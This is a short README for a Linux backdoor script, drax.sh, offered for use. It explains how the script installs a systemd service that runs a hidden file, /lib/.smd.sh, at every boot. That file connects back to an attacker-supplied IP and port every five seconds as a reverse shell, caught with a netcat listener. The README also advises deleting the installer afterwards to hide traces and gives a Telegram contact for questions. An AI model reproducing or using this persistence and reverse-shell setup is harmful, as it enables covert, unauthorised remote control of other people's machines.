# deamon.backdoor

Example Command
 `sudo ./drax.sh <ip> <port> `
 
This script will create a deamon and enable him `/etc/systemd/system/smd.service`

The deamon will start the created backdoor `/lib/.smd.sh` every time the system starts

The backdoor trys to connect to the given ip/port every 5 seconds. You can connect to the backdoor with `nc -lvpn <port>`

### Make sure to delete the drax.sh file after its executed

### t.me/VENDOMP for questions
